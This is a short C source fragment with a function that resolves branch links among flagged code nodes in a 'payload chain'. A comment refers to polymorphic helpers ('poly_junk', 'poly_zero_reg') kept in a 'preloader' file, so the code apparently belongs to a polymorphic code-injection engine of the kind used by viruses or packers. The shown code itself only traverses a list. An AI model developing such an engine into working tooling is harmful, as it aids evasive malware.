// Resolve internal branch links within payload chain (FL_ME nodes only)
void resolve_scatter_branch_links(struct CodeNode* head) {
    struct CodeNode* c;
    struct CodeNode* t;

    c = head;
    while (c != 0) {
        if ((c->flags & FL_ME) != 0 && (c->flags & FL_BRANCH) != 0 && c->target_rva >= 0) {
            t = head;
            while (t != 0) {
                if ((t->flags & FL_ME) != 0 && t->oldrva == c->target_rva) {
                    c->link = t;
                    break;
                }
                t = t->next;
            }
        }
        c = c->next;
    }
}

// poly_junk / poly_zero_reg / poly_load_imm / pick_scratch_reg /
// pick_indirect_reg live in bundles/preloader_common.mc — included at
// the top of this file.

